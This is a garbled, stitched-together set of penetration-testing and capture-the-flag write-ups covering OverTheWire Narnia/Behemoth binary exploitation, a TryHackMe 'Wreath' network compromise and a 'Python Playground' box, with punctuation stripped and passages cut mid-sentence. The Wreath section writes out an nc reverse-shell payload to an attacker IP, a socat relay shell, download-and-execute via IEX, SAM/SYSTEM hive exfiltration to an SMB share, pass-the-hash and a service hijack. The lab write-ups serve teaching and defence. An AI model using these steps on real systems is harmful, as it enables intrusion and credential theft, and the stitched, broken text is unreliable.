inner workings of the program reports Narnia image6 png There are two interesting functions  main and func  The main function simply gets the argument and passes it into func  Within this function are 2 global variables  local 1c and local 8  Twenty bytes are allocated to the former  while the latter is set to the argument  The local 1c variable has all of its contents set to 0  Within the while loop appears to be a sort of operation that is setting local 1c equivalent to some index within local 8  Just as in the previous binaries  Ghidra may have mistook a for loop for a while loop  It is possible that this segment in the code actually looks like the followinghighlight c for i 0  local 8 i      0   ilocal 1c i    local 8 i     i   i   1endhighlightAfter performing this operation  the program prints the contents of local 1c  Looking at this for loop  we can see that the vulnerability lies within the fact that 20 bytes are allocated to the local 1c variable  but an argument of greater than 20 bytes can be inputtedAdditionally  running checksec on the binary reveals that the NX bit is also disabledhighlight bash    0xd4y Writeup     business other overthewire narnia 8

vulnerable to exploitation using well known techniques  among them being re2libc  format string exploitation  and shellcode injection  The following remediations will strengthen the security of every tested binaryPerform boundary checks before passing user input into functionsAlmost every binary outlined in this report was vulnerable due to failure of checking boundariesSensitive memory addresses were overwritten allowing ret2libc among other attacksUnnecessary disabling NX bitThe NX bit was unnecessarily disabled for multiple binaries resulting in shellcode injectionUntrusted user input was directly passed to functionsTwo out of nine binaries  namely  Narnia 5   h n6g8yeh9n8qz  and  Narnia 7   h v80flpijk1ef   passed unsanitized user input directly to snprintf without boundary checksSETUID permissions for every binary tested in this report should be removed immediately until the remediations outlined above are observed1    ftnt ref1   https   github com pwndbg pwndbg  https

function is used to allow up to 200 bytes to be passed to the local cc variable  and therefore this binary is not vulnerable to a buffer overflow exploit  However  the user input  local cc  is passed directly to the printf function without any sort of sanitization  Consequently  the program is likely vulnerable to a string format exploit  3    ftnt3Discovery of Format String VulnerabilityThis can

as an input  it starts to leak memory from the stackThis vulnerability can be abused to overwrite memory by using the  n format string which writes the number of characters written into a pointer parameter  If the pointer parameter is an address that the binary uses  then the memory address of the function can be overwritten to point to shellcode  This can result in the execution of arbitrary

there are a total of three functions displayed  printf  fgets  and puts   However  the fgets and printf functions should not be overwritten  as these functions must work properly to accept the

by the address of puts and another string of four A s  This is then followed by puts   2  and finally the nop sled begins at 0xffffd4e8   8  For the purposes of this exploit  a memory address of 0xffffd518 was chosen  Note how this value in decimal is 4294956312 which theoretically could be obtained by passing in an exploit that is about 4294956312 bytes long  In reality  however  this would cause a memory overload  and even if it didn t  printing this many bytes to stdout would take a long time    As mentioned in  Exploit Development   h jagnc9qowxus   this can be bypassed by passing two  n format specifiers which point to two different points in memory whose addresses are two bytes apartThe largest value for each part of the memory address when split into two is 16 4   1 which is 65535  This largely reduces the 4294956312 length previously mentioned  Incidentally  the largest value possible for a 32 bit binary is 16 8   1 which is 4294967295 or 0xffffffffA value of 0xef was

called  and local 14 is set to equal its output  This output is then concatenated with  tmp  and local 30 is set to equal it  Afterwards  the local 18 variable is set to equal the output when opening a file in  tmp whose name corresponds to the id of the binary s process  which is local 30   If the file does not exist  then  PID not found   is printed out  Otherwise  the contents of the file is read out by using the getchar function within a while loopBinary ExploitationThe problem with this program is that it assumes that it can only read files within the  tmp directory  However  symbolic links can be used to make the program read the password file of the behemoth5 user Symbolic Link AttackSeeing as the pid of the binary cannot be easily determined before executing the program  a bash script can be utilized to create many files that correspond to possible PIDs  Before creating this bash script  the approximate PID of the binary must first be foundhighlight bash behemoth4 behemoth

the socket function  iVar3 is set to be 1337 before a sendto function is called  From these lines of code  it can be discerned that a UDP socket is opened on port 1337  and the password of the behemoth6 user is sent to itCatching Behemoth6 Password Through UDPBefore executing the binary  it is essential that another session be opened so that a UDP listener can be set up on port 1337behemoth5 behemoth    nc  lup 1337 localhostThe  u flag specifies UDP mode   p is for specifying a port  and  l tells nc to listen for inbound connectionsAfter executing the binary  the password

behemoth7   endhighlightNamely  that file is called behmoth6 reader and it might be used by the behemoth6 binary  After downloading the binary onto the attack box  the binary can be analyzed with the help of GhidraGhidraGhidra translated the assembly code found for each binary into the following reports Behemoth image9 png The code on the left was produced by the behemoth6 binary  while the code on the right is from the behemoth reader  Looking at the code for the bhemeoth6 reader program  a file named shellcode txt is expected  However  the contents of this file are not printed out anywhere  If a file named shellcode txt exists  then a small sanitization is performed against the file  if the 0xb byte exists within the file  then the program immediately exitsIn short  the program is executing the contents of the shellcode txt file as machine code  Therefore  shellcode will get executed by the binary  This  however  will not directly result in a privileged shell due to the fact that the SETUID bit is not enabled on the behemoth6 reader binary  Rather  the behemoth6 binary has the SETUID bit  and its interaction with the behemoth6 reader will determine the significance of the shellcodeLooking at the code for behemoth6  observe that the file is opened using the popen function in read mode  after which the output is passed into the   stream variable  This variable then gets passed into   s1 which is compared against the string  HelloKitty  in the strcmp function  If the contents of this variable matches the string  then a  bin sh shell is returnedAbusing popen  The output of the popen function is determined by the behemoth6 reader  Consequently  if the behemoth6 reader executes shellcode that makes it print out  HelloKitty   then a shell will be returned  There are already shellcodes online that perform this operation  and the following shellcode was used  9    ftnt9highlight c char code        xe9x1ex00x00x00               jmp     relative   MESSAGE

subsequent string in shellcode will result in a successful string comparison  To facilitate the conversion between ascii and shellcode  a conversion table  10    ftnt10  was usedAsciiHelloKittyShellcodex48x65x6cx6cx6fx4bx69x74x74x79After creating a directory in  tmp  so as to be able to create files   the following code was printed into shellcode txthighlight bash

binaries which in practice should not be vulnerable  turned out to be exploitable due to the calling of sensitive system commands  in particular  bin sh   This resulted in the horizontal privilege escalation in  Behemoth 0   h y1go15cthbxu  and  Behemoth 6   h 1iiwc3vpzmajThere were multiple different vulnerabilities associated with each binary  running from format string exploits to buffer overflows and privilege escalation via the PATH environment variable The following remediations should strongly be consideredPerform boundary checks on user inputMultiple binaries were vulnerable due to the lack of boundary checksShellcode injection was possible on many binaries due to this lack of validationBad shellcode filtering can be bypassed if EIP can be overwritten as can be seen in  Behemoth 7   h tqwpdz749mlq Filter user inputMalicious shellcode could easily be injected in multiple binaries due to the lack of user input validation  although shellcode could be encoded  this would nevertheless mitigate these kind of attacks Never run sensitive system commands unless absolutely necessarySystem commands such as  bin sh should rarely ever be called  especially within a SETUID binary  due to its insecurityBinaries that should not have been vulnerable turned out to be exploitable due to calling  bin shAlways use the full path of a commandPATH environment variable attacks were present on  Behemoth 2   h 9e7hwp9wx39h Never read files that can be created by an untrusted userSymbolic links can be used to exploit this vulnerability as can be seen in  Behemoth 2   h

vulnerabilities in a client s network  Thomas Wreath   1    ftnt1   The attacks conducted in this report were not carried out in a black box penetration testing environment  rather the client informed us that he had a git server hosted on one of the machines in his network from which he hosts his website  Furthermore  I was told that there are three computers in the client s network  one of which the client assumed I could not penetrate as it had antivirus software installedThough the client was cautious about downloading potentially dangerous software on any of his systems  he did not update software on two out of three computers  allowing me to gain immediate root access on two thirds of the network  The third machine ran insecure code on a web page which could be exploited through uploading a malicious image fileAttack NarrativeFirst Machine   200We are given the ip of one of the systems on the network  This is the only machine in the network that can be immediately accessed  and thus it will be the first targetReconnaissanceAs with all penetration tests  I started by enumerating the ports of the target  This is an important step  as it is useful in identifying possible attack vectors  The services and versions of our target can be enumerated using the nmap tool and giving it the flags  sC and  sV  The  sC flag runs nmap s default scripts  while the  sV flag detects the versions of the scanned services  Note that knowing the version of a service is essential in determining the likelihood of it being vulnerable  old versions tend to have more known vulnerabilities  as they have been exposed to the warzone of the internet for a longer period of time   We can enumerate all open ports with the  p  flag and output all formats with the  oA flag reports Wreath image28 png We see that there are only four ports open  From the nmap scan  observe that the target machine is running an HTTP and HTTPS server on ports 80 and 443 respectively  It s important to notice that it is running Apache httpd 2 4 37 which belongs to the CentOS Linux distribution  Therefore  it s very likely that the target is running CentOS reports Wreath image43 png Using the curl tool to send a GET request to the server  we see that it is trying to redirect us to https   thomaswreath thm  However  the DNS of the target is not set up  as can be observed from the domain not being able to route us to the requested website reports Wreath image38 png Currently  this domain is not recognized by any of our VirtualHost  2    ftnt2  definitions  However  adding thomaswreath thm to the  etc hosts file  the file in Linux which is responsible for mapping hostnames to IP addresses   and running the same curl command again produces a different output reports Wreath image5 png  reports Wreath image21 png We can add the  k flag to specify that we don t care to verify the server s certificate  note this is insecure but it is fine in the context of this test reports Wreath image65 png And now we get what looks to be a webpage  Browsing to this domain through Firefox  we reach yet another warning reports Wreath image7 png One thing that s important to do before proceeding to the website is to check the server certificate  The certificate could give information about more domains that the web server may have  as well as some other useful information like names  locations  and email addresses  This can be checked by clicking on the  Advanced   box  and then clicking on the  View Certificate  link  I didn t see anything too interesting  but there is one email address reports Wreath image45 png I now proceeded to the website and was met with the following page reports Wreath image39 png RCE ExploitationNothing out of the ordinary was found while browsing through this website  However  going back to the result of the nmap scan and looking at the software version of the Webmin interface  it turned out that this service was outdated  Searching this service on Google revealed that there is a CVE  Common Vulnerabilities and Exposures  for it  Namely  this vulnerability is categorised as CVE 2019 15107  3    ftnt3  and ranked as a 9 8 critical vulnerability  Exploiting this vulnerability allows unauthorized remote code execution  RCE  due to a backdoor in the password resetting function Reverse ShellSeeing as this is a well known vulnerability  Metasploit already had a script to exploit this version of Webmin reports Wreath image49 png After setting the LHOST and RHOST  I ran the exploit and got a shell reports Wreath image47 png The web server was running as root  It is better practice to run a web service as a low privileged user such as www data just in case the web server gets compromised PersistenceAs root  the highest privileged Linux user  we can extract the hash of users on the system and try to crack it  It s possible that this same password is used in some other machine on the network reports Wreath image58 png Providing the   example hashes flag in hashcat  a tool for cracking hashes  and grepping for unix  we can see that the mode for the  etc shadow hashes is 1800  note that the hash corresponding to mode 1800 looks most similar to the hashes in the  etc shadow file reports Wreath image27 png Alternatively  another way to determine the identity of a hash is by using tools such as hashid or hash identifier reports Wreath image37 png The password used for the root user is secure enough to not be cracked by the rockyou txt file  so I copied this hash to examine for later if neededAfter compromising the root user  I maintained persistence by going into  root  ssh id rsa and copying the contents of the id rsa file  this is a private key which is used to authenticate a client to a server reports Wreath image29 png Second Machine   150Host EnumerationWith full access on one of the three machines on the Wreath network  I enumerated the internal network to find any other systems by using nmap on the compromised system  a static binary of it can be downloaded on GitHub  4    ftnt4    To speed up the process  I added the  sn flag which disables port scans reports Wreath image33 png We see that there are a total of four other machines on the internal network  note we are 10 200 111 200   I was told by the client that the host ending in  1 is part of the AWS infrastructure used for creating the network  and the host ending in  250 is the OpenVPN server  As such  we will focus on the two hosts ending in  100 and  150 Port EnumerationAfter discovering these two hosts  I enumerated their ports reports Wreath image34 png Observe that all of the ports on the  100 machine are filtered  but the  150 computer has three ports open  80  3389  and 5985   It s important to note that it s likely this is a Windows machine due to ports 3389  typically reserved for RDP  and 5985  WRM   WinRM  being openPort ForwardingThe HTTP service on port 80 is a good one to forward because web servers have a big attack surface  I chose to forward this port to localhost on port 18020 using ssh reports Wreath image48 png Now when I visited localhost 18020  I was met with a web page reports Wreath image32 png Looking at the error on the webpage  we see that there are three directories1   registration login 2   gitstack 3   restThe  user subdirectory under  rest discloses information about the users on the GitStack software  but I was unable to find anything that looked alarming reports Wreath image44 png Visiting  gitstack redirected me to a login page on  registration login reports Wreath image50 png There is a nice handy message that says the default username and password is admin admin  but trying it out reveals that the credentials for this login page have since been changed  The source code of the page did not reveal anything eitherRCE ExploitationHowever  knowing that this machine is only available on the internal network  it is possible that its software is not updated  The outdated software of this website is especially alarming when looking at the output of nikto  a tool for scanning vulnerabilities on web servers reports Wreath image9 png Note the large amount of outdated softwareIt follows that the GitStack software used on the target might also be outdated and vulnerable  Searchsploit is a great tool for finding exploits for outdated software reports Wreath image16 png All three exploit results about GitStack are about the same version  namely 2 3 10   I then copied the exploit php webapps 43777 py onto my local machine Exploit AnalysisBefore running this exploit  we will examine it to see how it works reports Wreath image14 png As can be seen from the image above  the password field is most likely vulnerable  as it turns out  the username field is also vulnerable   The python script injects PHP code into the password field  and the web server executes it  This critical vulnerability was caused by passing unsanitized user input into an exec function  5    ftnt5 reports Wreath image15 png When running the script  it uploads a PHP web shell called exploit php with the parameter  a  to the  web directory  I modified the script and called it exploit 0xd4y php  as it is good practice to change the default configurations of an exploit whether that be a password to a backdoor  parameters  etc Reverse ShellI curled this web shell and provided it the  d flag to specify the data to be inputted reports Wreath image13 png And this web server is running as System  the highest privileged Windows user  even higher than Administrator   I then tried to find a way to get a reverse shell from the exploited system  The first thing to test is to see if our attack box can be pinged from the target  I made sure to use the  n flag to specify how many packets to send   It is extremely important to note this seemingly insignificant flag  If we were to not specify how many packets to send  the server would constantly be trying to ping us  and there would be no way for us to stop this command without somehow killing the process  A constant ping to our attack box would therefore look suspiciousPivoting through  200We can set up a tcpdump on the tun0 interface  the VPN routing path  and provide it with the icmp argument  Internet Control Message Protocol  so that we are only listening for pinging packets reports Wreath image40 png Alas  I did not receive a response from the server  This meant that we cannot send a direct reverse shell from  150 to us  However  we can use nishang  6    ftnt6  to get a socat reverse shell relay  CentOS  the operating system of the compromised  200 machine  has a very restrictive firewall called firewalld that will limit almost all inbound connections reports Wreath image46 png We can see that the firewall is activeUnfortunately  our attack box cannot  talk  with the  150 machine directly  but the host ending in  200 can  This means that we could get a reverse shell by setting up a listener on the  200 machine which forwards traffic to us  and then have the  150 host directly send the reverse shell to the  200 host Socat Relay Reverse ShellI used a socat reverse shell to demonstrate this  as it is instructive on how networking traffic can be directed1   We are going to set up a listening port on 20001 on the  200 machine and forward all traffic from that port to 20002 on our machine reports Wreath image35 png 2   Next  we will set up netcat listening on port 20002 on our system reports Wreath image66 png 3   I used the Invoke PowerShellTcp ps1 nishang script and added Invoke PowerShellTcp  Reverse  IPAddress 10 200 111 200  Port 20001 to the bottom of the script  so that when downloading the script using IEX  more on this later   each line in the script will be automatically executed giving us a reverse shell reports Wreath image20 png Note how we are sending the reverse shell to  200 on port 20001  remember all traffic on port 20001 will be directed to our port 20002 on our machine4   Now  the firewall will block inbound connections for any ports that are not specified as exceptions  We have to tell the firewall which ports it should allow for connections by using the firewall cmd command as such reports Wreath image41 png Alternatively you can type systemctl stop firewalld to completely disable the firewall  though this is one of the noisiest actions a pentester can do  and it should only be done when it is an absolute necessityRemember that port 20001 will be directing all traffic to us5   Port 20003 will be the HTTP server on  200 which we can set up with python3  m http server 20003  it will serve the powershell reverse shell file  which I renamed to 0xd4y rev ps16   Finally  it s time for the payload  We can download files   strings using IEX  Elixir s Interactive Shell  in powershell reports Wreath image70 png Note the usage of three single quotes in the data argument to tell our bash shell to not interpret anything inside the quotesUnfortunately  this payload did not work  most likely due to some special characters   I am running commands through a web shell  and therefore it is likely that the server is not understanding some of the special characters in the payload  This means that most likely we will have to url encode the payload for it to work reports Wreath image64 png Sure enough  when I executed this command  the output hanged and I got a hit on the python HTTP server reports Wreath image77 png So now that 0xd4y rev ps1 was executed by the server  there should be a reverse shell getting sent to port 20001 on  200 which is getting forwarded to us on 20002 reports Wreath image17 png  Attempting to Use MimikatzNow  with a reverse shell as System  we have the necessary privileges to extract password hashes using Mimikatz  a tool used to gather credentials on a system  Before downloading Mimikatz onto the target  it s important to check if the target is a 32bit or 64bit computer by using the systeminfo command reports Wreath image53 png Noticing that this is a 64bit computer  I downloaded a 64bit mimikatz binary reports Wreath image25 png I downloaded this binary in the C WindowsSystem32spooldriverscolor directory out of habit  as this is a world writable path and is typically whitelisted by AppLocker  a program which restricts which files can be executed based on the file s pathAlas  running Mimikatz on an unstable shell simply does not work  I tried getting a meterpreter shell  but that did not work either  However  with ssh being open on  200  a powerful tool named sshuttle can be leveraged as a VPN into this internal network reports Wreath image12 png We can confirm this worked by trying to curl the web page reports Wreath image10 png Shell StabilizationEarlier  we found that port 3389 was open on the  150 system  This is the port typically designated for Remote Desktop Protocol  RDP   and we can use this port to get a nice GUI on the box  First  I created a user with admin privileges inside the Remote Management Users group so as to allow us to remotely authenticate as the user through RDP reports Wreath image11 png We can now use evil winrm with our created credentials to easily get a shell on the box reports Wreath image76 png  MimikatzWith the user that we created  a nice GUI instance can be established using the xfreerdp command as follows reports Wreath image31 png This results in a GUI instance of the box  I executed cmd exe as Administrator because the created user is part of the Administrators group  With administrative privileges  it s possible to extract Windows  stored credentials  I talk about this in depth in my Bastion Writeup  7    ftnt7 reports Wreath image52 png  reports Wreath image59 png  reports Wreath image1 png These NTLM Hashes were edited so as to not expose the full hash  How Mimikatz WorksLooking at the output of Mimikatz  we can see the hashes for all the users on the system  This is due to the single sign on  SSO  feature of Windows  The SSO feature is used so as to not constantly ask the user to input his username and password whenever he wants to access a resource on the network  as this is simply tedious  once again  the great old war between convenience and security   Instead  the server hashes the user s password and stores it in the SAM  Security Account Manager  hive  These credentials are then managed by the Local Security Authority  LSASS exe   essentially enabling SSOCopying the output of Mimikatz  I saw that Thomas has an insecure password which hashcat cracked  alternatively  you can use  https   crackstation net   https   www google com url q https   crackstation net   sa D source editors ust 1653838005042499 usg AOvVaw1faAwek1  0r6RfsC5v4ie   8    ftnt8    However  the Administrator password was too secure to crack  but it is still possible to use this hash for authenticating as the Administrator user  Evil winrm has an extremely powerful flag denoted with  H which is used to gain access to an account by performing a pass the hash attack  PtH reports Wreath image68 png   How a Pass the Hash Attack  PtH  WorksAs can be seen in the image above  we authenticated as Administrator despite not specifying the password for the user  confirming that PtH worked  This attack works as follows  9    ftnt9Pentester  Cool  I just got Administrator s hash so let s use evil winrm to access the powershell exe resource as Administrator   Hey server  Give me powershell exe as AdministratorServer   Hi there Pentester  I know you want powershell exe as the Administrator user  but I can t just give it to you without verifying first that you are in fact the Administrator  I ll test you by sending you this random 16 byte integer  65532345234   34324234  Encrypt this with your password hash and send the response back to mePentester  No problem  I ll encrypt this 16 byte number with Administrator s hash   Hey Server  Here is my encrypted response                   121  the actual encryption doesn t really look like this in reality  but I will use this string for the purpose of demonstrationServer   Alright  thanks for the response Pentester  Hi Domain Controller  I challenged Pentester with this 16 byte integer  65532345234   34324234  and this was his encrypted response                    121Domain Controller  Right  well I have Server s challenge and Pentester s response  Let me go check my library of NTLM hashes and see if I can decrypt this response with Administrator s hash   and I can  This must be Administrator then   Hello Server  I was able to decrypt the response with Administrator s hash  so this must be Administrator  Grant the client the powershell exe resourceServer   Sure thing  Here you go PentesterPentester   Thanks for the shellThird Machine   100Port EnumerationAfter establishing persistence on the  150 host  the third and final machine is yet to be compromised  the  100 computer   The first thing we should do is enumerate the ports of the machine  just like we did with all the other compromised systems  Instead of trying to manually upload a port scanning script onto the box  we can use evil winrm by utilizing the  s flag reports Wreath image22 png We see that ports 80 and 3389 are open  These most likely correspond to HTTP and RDP respectively  Unfortunately  we cannot access this computer through the  200 proxy because it is only visible by  150Forward SOCKS ProxyThis means that we will need to create a proxy on the  150 machine  A tool called chisel comes in handy for this operation  To set up a forward SOCKS proxy on the  150 machine  we first need to follow a couple of steps1   The server must be told to disable the firewall on the port we want to use for the forward proxy  I will use port 30001 reports Wreath image6 png 2   The server should then be told to listen on port 30001 for inbound connections reports Wreath image18 png 3   Next  on the attacking box we want to connect to the listening port  and forward all data to a proxy sitting on 30002 reports Wreath image71 png 4   We then configure the web browser extension FoxyProxy to connect to this proxy reports Wreath image8 png 5   Finally  we can visit the website sitting on  100 reports Wreath image73 png Examining the Web ServerAlong with FoxyProxy  Wappalyzer is also a very useful browser extension which displays useful information about how a website is built  Running this extension on Thomas s personal website  we see the following reports Wreath image36 png  Analysing the Website s CodeThis website looks identical to the one on the  200 host  Thomas told us that he is  serving a website that s pushed to my git server   The  150 machine has a git server and this is most likely what he was referring to  so I downloaded the source code of his website reports Wreath image75 png Using the extractor tool from GitTools  10    ftnt10   I iterated through the commits of the git repository  Unfortunately  this tool does not list the commits by date  but this can be done manually by looking at the parent of each commit reports Wreath image74 png We see that the commit starting with 70dd does not have a parent  so this must be the oldest commit  The parent of 82df is 70dd  and the parent of 345a is 82df  This means that from youngest to oldest the commits are as follows1   345a2   82df3   70ddWe can examine the code from the most recent commit  Seeing as Wappanalyzer identified Thomas s webpage as being run in PHP  it follows that there should likely be an index php file reports Wreath image54 png Taking a look at the file  there seems to be an upload feature that redirects uploaded files to a directory called uploads        reports Wreath image62 pngThe filter checks if a file is an image based on its size and if a file ends with a valid extension  We can see that the allowed extensions are jpg  jpeg  png  and gif  so I examined how the webpage identifies the extension reports Wreath image60 png The explode function splits a string into an array based on a specified parameter  In the code  it is set to split based on the period character and grabs the string at index one  note that this is the second element in the array  as the first element is at index zero   It then compares this string with one of the allowed extensions  The problem with this is that upon uploading a file called reverse shell jpg php  the code will split the file as followsreverse shell   jpg   phpThen  the string in the first index  jpg  will be compared  Thus  we have bypassed the first filter  The second filter  i e  the image size check  can also be bypassed  11    ftnt11   We can add a comment to an image with malicious php code  and if the server executes our image as php  then our malicious code will work as a web shell reports Wreath image56 png A basic HTTP authentication is required to access the  resources directory  but we cracked Thomas s hash  before   h wzvkxqwdhgz4   so it is likely that Thomas reused this password for authentication to his web server  We can guess that the username is Thomas  or other variations of his name  and we get into the upload page  it turns out that the username was indeed ThomasReverse Shell reports Wreath image3 png I then uploaded the malicious image file  0xd4y image jpg php reports Wreath image51 png Visiting the uploaded script on resources uploads 0xd4y image jpg php reveals that it got successfully uploaded  To test if the image successfully is getting executed as php  I gave the command of whoami to the parameter cmd reports Wreath image63 png And the php web shell works  The next step is to get a reverse shell  After identifying the target as a 64 bit machine by using systeminfo  I uploaded a 64bit netcat binary  12    ftnt12  and called it 0xd4y nc exe  I then set up an HTTP server on my local box with python and downloaded the binary onto the system with curl  To get a reverse shell  I used a simple nc reverse shell payload  powershell exe 20C xampphtdocsresourcesuploads0xd4y nc exe 2010 50 112 6 20443 20 e 20cmd exe reports Wreath image30 png Note how I used port 443 for the reverse shell  as this port tends to be treated as unsuspicious by AV  In contrast  using port 1337 or port 9001 seems very suspicious  but in this case it works anywaysPrivilege Escalation to System Searching for MisconfigurationsEnumerating the privileges of our compromised user  we don t see anything too out of the ordinary reports Wreath image72 png However  this user does have the SeImpersonatePrivilege which could potentially be vulnerable to exploits such as Juicy Potato  13    ftnt13   note that even though this is a 2019 Windows system rather than 2016  there have been some exploitations of this privilege in later versions  14    ftnt14I ignored this potential privilege escalation vector due to its greater complexity  and I enumerated the services for a potential vulnerability to an unquoted service path attack Unquoted Service Path AttackIt s likely that the default Windows paths will not be vulnerable to this sort of attack  so I focused on services that were not in C Windows reports Wreath image67 png As it turned out  there was a service that contained an unquoted path called SystemExplorerHelpService  How an Unquoted Service Path Attack WorksDue to there not being quotes around the path to this service  Windows does not know where to execute the desired binary  Seeing as the path for this vulnerable service is C Program Files  x86 System ExplorerSystem ExplorerserviceSystemExplorerService64 exe  Windows will check for a binary in the following order  15    ftnt151   C Program exe2   C Program Files  x86 System exe3   C Program Files  x86 System ExplorerSystem exe4   C Program Files  x86 System ExplorerSystem Explorerservice exe5   C Program Files  x86 System ExplorerSystem ExplorerserviceSystemExplorerService64 exeIt is highly unlikely that the compromised user has write access to C Program Files x86   but it is probable that the user can write to C Program Files x86 System Explorer  Therefore  we can create a malicious binary called System exe in the appropriate path  and it will get executed  Creating a Malicious BinaryChecking to see if this service is running as System revealed that it is reports Wreath image24 png This seemed like a good vector for privilege escalation  however  I understood that I would be lucky if the compromised user had permissions to edit this service reports Wreath image4 png Seeing as we are part of the BUILTINUsers group  we have FullControl to this service  The System Explorer executable can therefore be replaced by whatever we would like  I created a program in C  called malicious cs that returns a reverse shell reports Wreath image78 png Following the creation of the script  I compiled this program with mcs  a C  compiler reports Wreath image26 png After compiling the program  I renamed malicious exe to System exe  Seeing as System is running the service we are trying to hijack  it follows that we should get a reverse shell as System when restarting the service  After downloading the binary to the target  I copied it over to the C Program Files  x86 System Explorer directory reports Wreath image19 png With the malicious binary in place  I set up a netcat listener on port 443  as specified in the C  code  before restarting the service reports Wreath image57 png Typing sc stop SystemExplorerHelpService  to stop the service  and sc start SystemExplorerHelpService  to start the service  resulted in a reverse shell as System reports Wreath image2 png Data ExfiltrationNow  with a reverse shell as System  we can extract the stored credentials on this system  Mimikatz cannot be used as Antivirus is installed on this machine  However  because we are System  we can copy the SAM and SYSTEM files and locally extract the stored hashes  I set up an SMB server on my machine to download the files with sudo impacket smbserver share    smb2support  username 0xd4y  password pass and transferred the SAM and SYSTEM hives as follows reports Wreath image61 png  reports Wreath image55 png Note that we received the NTLMV2 hash of our created SMB user  Cracking this hash reveals that the password of 0xd4y is passOn the reverse shell  I typed copy HKLMSYSTEM 10 50 112 6shareSYSTEM  andcopy HKLMSAM 10 50 112 6shareSAM reports Wreath image42 png Now with the sensitive SAM and SYSTEM hives on my local system  I was able to extract all hashes using the impacket secretsdump tool reports Wreath image69 png CleanupAfter fully compromising the Wreath Network  I deleted all the binaries that I downloaded  namely 0xd4y socat  0xd4y nc exe  System exe  and exploit 0xd4y php   Though the removal of these binaries allowed for a stealthier compromise  the attacks conducted in this report were not meant to be particularly stealthy  Many binaries used were not obfuscated  and file transfers were conducted over SMB and HTTP rather than HTTPSConclusionThe attack surface of a web server is much bigger than most other services  It is essential to be wary of which services are running as a privileged user  There was no need for local privilege escalation in two out of three compromised machines during this penetration test  If possible  it should be refrained from using root to run services unless it is absolutely necessary  This will cause a greater difficulty for an attacker to attain root access on a system  and will greatly mitigate the potential damage in case of a breachThe client had multiple critical vulnerabilities in his network  The specific remediations for patching the vulnerabilities outlined in this report are as followsInstall the latest software for all running services  even if a system is only running on an internal network with no outside internet accessThe first and second compromised machines had old software with critical vulnerabilities which can be easily patched by updating the softwareRefrain from using root to run any services unless it is absolutely necessaryThis note is especially true for web servers as they have a large attack surface  It is recommend to create a low privileged user specifically for the purpose of running a web serviceNever reuse passwordsA cracked password from the second compromised machine was reused for accessing a webpage on the third machineBe mindful of potential misconfigurations The privilege escalation on the client s personal computer was possible due to a misconfiguration of a service running as SystemThe compromised low privileged user was able to configure services despite not being part of the Administrators groupFilters in code should be meticulously analyzedCode for uploading files on the website of the third machine did not successfully filter potentially malicious filesThe goals of this penetration test were met  As requested by the client  I was able to successfully compromise the Wreath network with root access on all three systems  The client is highly encouraged to patch his systems with the aforementioned remediations as soon as possible1    ftnt ref1   https   tryhackme com room wreath  https   www google com url q https   tryhackme com room wreath sa D source editors ust 1653838005064997 usg

throughout each step of exploitation and piece each compromised puzzle piece together date    2021 03 26image     images 0xd4y logo gray png tags     Python  PATH Injection  LogicThis report can be

instead because it is better formatted reports PythonPlayground image18 png  reports PythonPlayground image16 png As the name suggests  this box was all about using python to exploit its vulnerabilities  Each part of this box was like a puzzle piece which  when connected together  gave you the ability to escalate to root  Let s get right into the box  as I ll go into detail about each aspect of exploiting this box s vulnerabilitiesRECONAs usual  I will start by scanning the ports with nmap reports PythonPlayground image10 png Looks like only http and ssh are open  There is not much information from this nmap scan  other than that we know the box is running Ubuntu reports PythonPlayground image27 png Clicking on Login or Sign up doesn t lead to anything interesting  as we are just met with this page reports PythonPlayground image5 png It looks like each web page is appended with  html  so let s run a gobuster on the root page with the extension  html reports PythonPlayground image22 png The  admin html directory particularly stands out  so let s check it outGetting Credentials reports PythonPlayground image2 png Immediately from the name of this login form  it looks like there is probably a user named Connor  It s good practice to check out the source code to see if there are any interesting comments or links to other directories on the website reports PythonPlayground image26 png  reports PythonPlayground image23 png So we can see from the code above that the login form takes a password and  hashes it   I put  hash  in quotes because this code does not actually hash an input  In an actual password hash  the output does not give information about the input  For example  in mathematical operation of addition we know that 1 1 2  However  let s say I added two numbers together without telling you which numbers I added  and all I told you was that the sum of those two numbers is equal to 2  Then I asked you   Which two numbers did I add to get the number 2    It could be 1 1  or 2 0  or maybe even 1 7 0 3  The possibilities are endlessThe problem with the code on the webpage  is that it leaks the hash to us as well as how the hash was produced  but more importantly  the length of the hash is dependent on the length of the input  This means that data is not lost during the hashing process  All of this considered  we can reverse the hash to get the password  A very simple way to do this is by taking the javascript code that we saw in the source of the webpage  and inputting all characters in the order determined by the ascii table  Using this  we can see the output that the hash creates for each letter  remember about how this code does not lose inputted data reports PythonPlayground image15 png Using this method  our code does not need a lot of lines  You can view my script  here  https   www google com url q https   github com 0xd4y Writeups blob gh pages TryHackMe crack py sa D source editors ust 1653953672142990 usg AOvVaw17cVA7TMh7fjsB E1XDH f  if you d like  I have since edited it to be more user friendlyIncidentally  even if we did not know the code of the hash  we can see that the length of the output is always four times the length of the input  because data is not lost reports PythonPlayground image6 png Anyways  let s try the cracking function reports PythonPlayground image20 png And we get Connor s password as spaghetti1245  Inputting the username connor and the password  we get redirected to  super secret admin testing panel htmlIt turns out that we could have just gone to this page without even needing Connor s password reports PythonPlayground image11 png I did not realize this the first time going through the box  Looks like authenticated cookies are not needed to view this site reports PythonPlayground image25 png Typing python code into the text field  we see that this form runs our code  So let s try a python reverse shell reports PythonPlayground image12 png Unfortunately  this does not work as there is some sort of blacklist on the import keyword  I tried bypassing this by writing  imp  to a file and then appending  ort  to it  Finally  I could try executing it with the exec function reports PythonPlayground image8 png Unfortunately  the exec function is blacklisted as well  However  if you have read my  Develpy Writeup  https   www google com

reports PythonPlayground image13 png Using the   import   keyword  we can circumvent the blacklist reports PythonPlayground image1 png Awesome  We re root  But there s a catch reports PythonPlayground image14 png Looks like we are in a docker container     Well  let s just get the first flag reports PythonPlayground image21 png We can also ssh into the box using the credentials for Connor that we saw earlier reports PythonPlayground image24 png ROOT PRIVESCSo we have a reverse shell inside a docker container and we are in the actual box through an ssh session  but how are we going to get root  I ran the  linPEAS  https   www google com url q https   github com carlospolop privilege escalation awesome scripts suite tree master linPEAS sa D source editors ust 1653953672147938 usg AOvVaw3oP6L3vG7KcGjXT1fkgu0Z  privilege escalation enumeration script on the ssh session  but it did not find anything out of the ordinary  This part of rooting the box is really cool and is when we piece together our shells  Let s run linPEAS on the reverse shell and see if we can find anyway to escape it and get root reports PythonPlayground image17 png Above we can see that the log directory is mounted on the docker container  Using this mount  we can interact directly with the host system  It s important to note that due to us being root in the docker container  we can make files on  var log as root  We can create a setuid binary by compiling the following code and giving it setuid permissions reports PythonPlayground image19 png Unfortunately  there is no way to download this using 